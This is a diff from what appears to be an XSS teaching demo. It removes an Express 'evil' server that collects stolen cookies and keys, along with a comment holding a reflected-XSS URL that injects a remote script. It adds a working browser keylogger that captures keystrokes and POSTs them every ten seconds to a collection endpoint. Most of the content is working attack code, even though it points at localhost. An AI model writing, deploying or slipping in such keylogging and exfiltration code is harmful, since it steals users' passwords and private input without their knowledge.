@@ -1,25 +1,27 @@
-﻿var express = require('express');
-var app = express();
+﻿var i = 10;
+var res = '';
 
-app.use(function (req, res, next) {
-	res.header('Access-Control-Allow-Origin', '*');
-	next();
+document.addEventListener('keydown', (e) => {
+	i--;
+	res += e.key;
+	if (i === 0) {
+		i = 10;
+		console.log(res);
+	}
 });
 
-app.get('/cookie', function (req, res, next) {
-	console.log('GET /cookie');
-	console.log(req.query.data);
-	res.send('Thanks!');
-});
+var tenSeconds = 10000;
+var myVar = setInterval(sendColectedData, tenSeconds);
 
-app.get('/keys', function (req, res, next) {
-	console.log('GET /keys');
-	console.log(req.query.data);
-	res.send('I\'ll try to remember that..');
-});
-
-app.listen(3001, function () {
-	console.log('"Evil" server listening at localhost:3001');
-});
-
-// http://localhost:5000/Home/Login?redirectedFrom=<script src="http://localhost:5555/js/definetlyNOTevil.js"></script>
+function sendColectedData() {
+	if (res !== '') {
+		$.ajax({
+			type: "POST",
+			url: "http://localhost:5555/api/data/saveToFile",
+			data: res,
+			success: function () {
+				res = ''
+			}
+		});
+	}
+};
